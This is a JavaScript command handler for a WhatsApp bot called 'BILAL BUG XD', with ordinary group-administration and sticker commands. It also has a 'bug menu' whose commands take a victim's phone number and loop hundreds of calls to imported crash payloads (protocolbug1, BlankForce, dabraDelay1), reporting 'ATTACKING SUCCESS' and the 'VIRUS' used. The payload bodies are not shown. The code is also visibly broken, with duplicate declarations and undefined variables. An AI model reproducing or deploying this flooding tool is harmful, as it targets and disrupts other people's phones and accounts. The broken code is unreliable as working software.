const { default: baileys, proto, getContentType, generateWAMessage, generateWAMessageFromContent, generateWAMessageContent, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");
const { default: makeWaSocket } = require('@whiskeysockets/baileys');
const fs = require('fs');
const mime = require('mime-types');
const NodeCache = require('node-cache');
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const pino = require('pino')
const { performance } = require('perf_hooks');
const { writeFile, unlink } = require('fs/promises');
const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
const JavaScriptObfuscator = require('javascript-obfuscator');
const path = require('path');
const sharp = require('sharp');
const ffmpeg = require('fluent-ffmpeg');
const cheerio = require('cheerio');
const { promisify } = require('util');
const gis = promisify(require('g-i-s'));
const { getBuffer, getGroupAdmins, getSizeMedia, formatSize, checkBandwidth, formatp, fetchJson, reSize, sleep, isUrl, runtime } = require('./database/mylib');

const { devaskNotBot, dabraDelay1, BlankForce, protocolbug1 } = require('database/bug');

module.exports = async function zynHandler(devaskNotBot, m, msg, store) { 
 try{   
    // Get command text
    let body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "interactiveResponseMessage" ? (() => {
        try {
          return JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id;
        } catch {
          return "";
        }
      })() :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "messageContextInfo" ?
        m.message.buttonsResponseMessage?.selectedButtonId ||
        m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
        m.message.interactiveResponseMessage?.nativeFlowResponseMessage ||
        m.text :
      ""
    );

    if (!body) body = "";
    const budy = (typeof m.text === "string" ? m.text : "");
    
    const sender = m.key.fromMe ? devaskNotBot.user.id.split(":")[0] + "@s.whatsapp.net" || devaskNotBot.user.id : m.key.participant || m.key.remoteJid;
const budy = (typeof m.text === 'string' ? m.text : '');
const prefix = ".";
if (!body.startsWith(prefix)) return;  
const isCreator = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
var crypto = require("crypto")
const moment = require('moment-timezone');
const time = moment().format("HH:mm:ss DD/MM");
let { randomBytes } = require("crypto")
const makeid = randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = args.join(" ")
const botNumber = await devaskNotBot.decodeJid(devaskNotBot.user.id)
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || "No Name"
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await devaskNotBot.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participants?.admin !== null ? true : false

if (!ask.public) {
if (!m.key.fromMe) return;
        }
switch (command) {

// ==================== MENU & INFORMATION ====================
case 'menu': {
  const { generateWAMessageContent, generateWAMessageFromContent } = require('@adiwajshing/baileys');
await ask.sendMessage(m.chat, { react: { text: "📁", key: m.key } }) 
  try {
    const categories = [
      {
        title: "MENU",
        desc: `
╭━━━⊰menu⊱━━━╮
├ ◦ public
├ ◦ private
├ ◦ promote
├ ◦ demote
├ ◦ kick
├ ◦ tagall
├ ◦ ping
├ ◦ jid
├ ◦ sticker
├ ◦ welcome 
├ ◦ goodbey
╰━━━━━━━━━━━━━━━╯`,
        button: { text: "CHANNEL", url: "https://whatsapp.com/channel/0029Vaj3Xnu17EmtDxTNnQ0G/488" },
        image: "https://i.ibb.co/qYG993MS/72a4e407f204.jpg"
      },
      {
        title: "BUGMENU",
        desc: `
╭━━━⊰bug-menu⊱━━━╮
├ ◦ bilal-bug
├ ◦ bilal-bug2
├ ◦ bilal-bug3
├ ◦ bilal-x-group
╰━━━━━━━━━━━━━━━╯`,
        button: { text: "CHANNEL", url: "https://whatsapp.com/channel/0029Vaj3Xnu17EmtDxTNnQ0G/488" },
        image: "https://i.ibb.co/qYG993MS/72a4e407f204.jpg"
      }
    ];

    // Generate carousel cards with CTA buttons
    const carouselCards = await Promise.all(
      categories.map(async (item, index) => {
        const imageMsg = (
          await generateWAMessageContent(
            { image: { url: item.image } },
            { upload: devaskNotBot.waUploadToServer }
          )
        ).imageMessage;

        return {
          header: {
            title: item.title,
            hasMediaAttachment: true,
            imageMessage: imageMsg
          },
          body: { text: item.desc },
          footer: { text: `📖 Page ${index + 1} of ${categories.length}` },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: item.button.text,
                  url: item.button.url,
                  merchant_url: item.button.url
                })
              }
            ]
          }
        };
      })
    );

    // Build the carousel message
    const carouselMessage = generateWAMessageFromContent(
      from,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: { text: "⿻l ꙰lBILAL⿻BUG-XD ꙰⿻" },
              footer: { text: "Swipe ⬅️➡️ to explore all commands" },
              carouselMessage: { cards: carouselCards }
            }
          }
        }
      },
      { quoted: m }
    );

    // Send carousel
    await devaskNotBot.relayMessage(from, carouselMessage.message, {
      messageId: carouselMessage.key.id
    });

  } catch (error) {
    console.error("❌ Menu command error:", error);
    await reply("⚠️ Failed to load menu. Please try again later.");
  }
    }
break;

case "ping": {
 const startTime = Date.now();
 const pingAsk = await m.reply('Pong 🧃!');
 
 const latency = Date.now() - startTime;
 await m.reply(`BILAL BUG XD :\n> ${latency}Ms`);   
}
break;

// ==================== GROUP MANAGEMENT ====================
case "welcome": {
 if (!m.isGroup) return devaskNotBot.sendMessage(m.chat, {
 text: "❌ *This command is for groups only.*"
 }, { quoted: m });

 const groupMetadata = await devaskNotBot.groupMetadata(m.chat);
 const groupAdmins = groupMetadata.participants?.filter(p => p.admin)?.map(p => p.id) || [];
 const isAdmin = groupAdmins.includes(m.sender) || m.key.fromMe;

 if (!isAdmin) return devaskNotBot.sendMessage(m.chat, {
 text: "🚫 *Only administrators can use this command.*"
 }, { quoted: m });

 global.db = global.db || {};
 global.db.welcome = global.db.welcome || {};

 const arg = text?.toLowerCase();
 if (!["on", "off"].includes(arg)) {
 return devaskNotBot.sendMessage(m.chat, {
 text: `📌 *Usage:* ${prefix}welcome on/off`
 }, { quoted: m });
 }

 const enable = arg === "on";
 global.db.welcome[m.chat] = enable;

 await devaskNotBot.sendMessage(m.chat, {
 text: `👋 *Welcome message ${enable ? "enabled ✅" : "disabled ❌"}*`
 }, { quoted: m });

 // Built-in event for automatic sending
 devaskNotBot.ev.on('group-participants.update', async (update) => {
 try {
 const isWelcomeEnabled = global.db?.welcome?.[update.id];
 if (!isWelcomeEnabled) return;

 const metadata = await devaskNotBot.groupMetadata(update.id);

 for (const participant of update.participants) {
 if (update.action === 'add') {
 const ppUser = await devaskNotBot.profilePictureUrl(participant, 'image').catch(() => 'https://i.ibb.co/rb6X4jQ/default.jpg');
 const username = participant.split('@')[0];
 const groupName = metadata.subject;

 const welcomeText = `🎉 *Welcome to @${username} in the group ${groupName}!*\n\n💬 Introduce yourself or get to know the members!`;

 await devaskNotBot.sendMessage(update.id, {
 image: { url: ppUser },
 caption: welcomeText,
 mentions: [participant]
 });
 }
 }
 } catch (err) {
 console.log("Welcome error:", err);
 }
 });
} 
break;

case "goodbye": {
 if (!m.isGroup) return devaskNotBot.sendMessage(m.chat, {
 text: "❌ *This command is for groups only.*"
 }, { quoted: m });

 const groupMetadata = await devaskNotBot.groupMetadata(m.chat);
 const groupAdmins = groupMetadata.participants?.filter(p => p.admin)?.map(p => p.id) || [];
 const isAdmin = groupAdmins.includes(m.sender) || m.key.fromMe;

 if (!isAdmin) return devaskNotBot.sendMessage(m.chat, {
 text: "🚫 *Only administrators can use this command.*"
 }, { quoted: m });

 global.db = global.db || {};
 global.db.goodbye = global.db.goodbye || {};

 const arg = text?.toLowerCase();
 if (!["on", "off"].includes(arg)) {
 return devaskNotBot.sendMessage(m.chat, {
 text: `📌 *Usage:* ${prefix}goodbye on/off`
 }, { quoted: m });
 }

 const enable = arg === "on";
 global.db.goodbye[m.chat] = enable;

 await devaskNotBot.sendMessage(m.chat, {
 text: `👋 *Goodbye message ${enable ? "enabled ✅" : "disabled ❌"}*`
 }, { quoted: m });

 // Built-in event for automatic sending
 devaskNotBot.ev.on('group-participants.update', async (update) => {
 try {
 const isGoodbyeEnabled = global.db?.goodbye?.[update.id];
 if (!isGoodbyeEnabled) return;

 const metadata = await devaskNotBot.groupMetadata(update.id);

 for (const participant of update.participants) {
 if (update.action === 'remove') {
 const ppUser = await devaskNotBot.profilePictureUrl(participant, 'image').catch(() => 'https://i.ibb.co/rb6X4jQ/default.jpg');
 const username = participant.split('@')[0];
 const groupName = metadata.subject;

 const goodbyeText = `😢 *@${username} left the group ${groupName}...*\n\nWe hope to see you again soon!`;

 await devaskNotBot.sendMessage(update.id, {
 image: { url: ppUser },
 caption: goodbyeText,
 mentions: [participant]
 });
 }
 }
 } catch (err) {
 console.log("Goodbye error:", err);
 }
 });
}
break;

case "promote":
case "promot": {
 if (!isGroup) return m.reply("For groups only");
 if (!isAdmin && !isCreator) return m.reply("Command reserved for group administrators only");
 if (!isBotAdmin) return m.reply("The bot is not administrator");

 if (m.quoted || text) {
 let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 await devaskNotBot.groupParticipantsUpdate(m.chat, [target], 'promote')
 .then((res) => m.reply(`User ${target.split("@")[0]} is now administrator`))
 .catch((err) => m.reply(err.toString()));
 } else {
 return m.reply("Example: 241XXX/@tag");
 }
}
 break; 

case "demote": {
 if (!isGroup) return m.reply("Group Only");
 if (!isAdmin && !isCreator) return m.reply("Admin Only");
 if (!isBotAdmin) return m.reply("The bot is not administrator in this group");

 if (m.quoted || text) {
 let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 await devaskNotBot.groupParticipantsUpdate(m.chat, [target], 'demote')
 .then((res) => m.reply(`Member ${target.split("@")[0]} is no longer administrator in this group`))
 .catch((err) => m.reply(err.toString()));
 } else {
 return m.reply("Example: 241XX");
 }
}
 break;

case "open": {
if (!isGroup) return m.reply('For groups only')
if (!isBotAdmin) return m.reply('the bot is not admin')
if (!isAdmin && !isCreator) return m.reply(mess.admin)
await devaskNotBot.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("*GROUP SETTINGS CHANGED ✅*\neveryone can send messages in the group")
}
break

case "close": {
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmin) return m.reply('you are not admin')
if (!isAdmin && !isCreator) return m.reply(mess.admin)
await devaskNotBot.groupSettingUpdate(m.chat, 'announcement')
m.reply("*GROUP SETTINGS SUCCESSFULLY CHANGED ✅*\nonly admins can send messages")
}
break;

case 'kick': {
 if (!isGroup) return m.reply('For groups only');
 if (!isCreator && !isAdmin) return m.reply(mess.admin);
 if (!isBotAdmin) return m.reply("✖️ *The bot must be administrator*");

 if (text || m.quoted) {
 const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
 var onWa = await devaskNotBot.onWhatsApp(input.split("@")[0]);

 if (onWa.length < 1) return m.reply("Number not registered on WhatsApp");

 const res = await devaskNotBot.groupParticipantsUpdate(m.chat, [input], 'remove');
 await m.reply(`Success: ${input.split("@")[0]} has been kicked from the group`);
 } else {
 return m.reply("Send the command with text:\n.kick @tag/reply");
 }
}
break;

case "tagall":
case "tag": {
 await devaskNotBot.sendMessage(m.chat, { react: { text: "📣", key: m.key } });

 if (!isCreator && !isAdmin) return m.reply(mess.admin);
 if (!isGroup) return m.reply(mess.group);

 let teks = "*BILAL-BUG-XD*\n" +
 `*Message* : ${text ? text : ''}\n╭──♕ BILAL-BUG-XD ♕ ──╮\n`;

 for (let mem of participants) {
 teks += `│ ❖ @${mem.id.split('@')[0]}\n`;
 }
 teks += `╰━━━━━━━━━━━━━━━╯`
 // Send message with image
 await devaskNotBot.sendMessage(m.chat, {
gifPlayback: false,
 image: { url: 'https://i.ibb.co/qYG993MS/72a4e407f204.jpg'},
 caption: teks,
 mentions: participants.map(a => a.id)
 }, { quoted: m });
}
break;

// ==================== MEDIA & STICKERS ====================
case 'sticker': case 's': {
 if (!quoted) return m.reply(`Reply Image or Video with command ${prefix + command}`);
 
 if (/image/.test(mime)) {
 let media = await quoted.download();
 let encmedia = await devaskNotBot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
 await fs.unlinkSync(encmedia);
 } else if (/video/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 17) return m.reply('max 17s');
 
 let media = await quoted.download();
 let encmedia = await devaskNotBot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
 await fs.unlinkSync(encmedia);
 } else {
 return m.reply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
 }
}
break;

// ==================== BOT OWNER & SPECIAL ====================
case 'bilal-bug': {
if (!isCreator && !isPremium) return m.reply(mess.owner);
if (!text) return m.reply("241xxx or tag @user")

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = text.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return m.reply('use command + 241xxxx')
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 ATTACKING SUCCESS 」
    
𖥂 TARGET : *${lock}*
𖥂 VIRUS : *${command}*

\`—( Note )\`
> Please pause after sending bug`
m.reply(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© - Invisible
𖥂 Protocolbug1 : ${i}/400
𖥂 Target : ${target}`));
await protocolbug1(devaskNotBot, target, false);
}
}
break;

case 'bilal-bug2': {
if (!isCreator && !isPremium) return m.reply(mess.owner);
if (!text) return m.reply("241xxx or tag @user")

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = text.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return m.reply('use command + 241xxxx')
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 ATTACKING SUCCESS 」
    
𖥂 TARGET : *${lock}*
𖥂 VIRUS : *${command}*

\`—( Note )\`
> Please pause after sending bug`
m.reply(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© - Invisible
𖥂 Protocolbug1 : ${i}/400
𖥂 Target : ${target}`));
await dabraDelay1(devaskNotBot, target, false);
await BlankForce(devaskNotBot, target, false);
}
}
break;

case 'bilal-bug3': {
if (!isCreator && !isPremium) return m.reply(mess.owner);
if (!text) return m.reply("241xxx or tag @user")

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = text.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return m.reply('use command + 241xxxx')
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 ATTACKING SUCCESS 」
    
𖥂 TARGET : *${lock}*
𖥂 VIRUS : *${command}*

\`—( Note )\`
> Please pause after sending bug`
m.reply(teks)

for (let i = 0; i < 200; i++) {
console.log(chalk.green(`© - Invisible
𖥂 bug : ${i}/400
𖥂 Target : ${target}`));
await devaskNotBot(devaskNotBot, target, false);
await BlankForce(devaskNotBot, target, false);
await dabraDelay1(devaskNotBot, target, false);
}
}
break;

case "jid": {
if (!isCreator && !isPremium) return
m.reply(`BILAL BUG XD\n𝖸𝖮𝖴𝖱 𝖩𝖨𝖣 😋 ${m.chat}`)
}
break;

case "private": {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "🔒", key: m.key } });
                if (!isCreator) m.reply('For Owner Only');
                devaskNotBot.public = false;
                m.reply('PRIVATE MODE ACTIVATED');
                   }
                break;

            case "public": {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "🔓", key: m.key } });
                if (!isCreator) m.reply('For Owner Only');
                devaskNotBot.public = true;
                m.reply('PUBLIC MODE ACTIVATED');
                }
                break;

// ==================== DEFAULT HANDLER ====================
default: {
    await devaskNotBot.sendMessage(m.chat, { react: { text: "❌", key: m.key } });

    await devaskNotBot.sendMessage(m.key.remoteJid, {
        gifPlayback: false,
        image: { url: "https://i.ibb.co/qYG993MS/72a4e407f204.jpg" },
        caption: "> Command not recognized, type *.menu* to see available options."
    });
    break;
}

}
    } catch (err) {        
        console.log(chalk.red("Error in handler.js =>"), err);
    }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.whiteBright('├'), chalk.keyword("red")("[ UPDATE ]"), __filename);
    delete require.cache[file];
    require(file);
});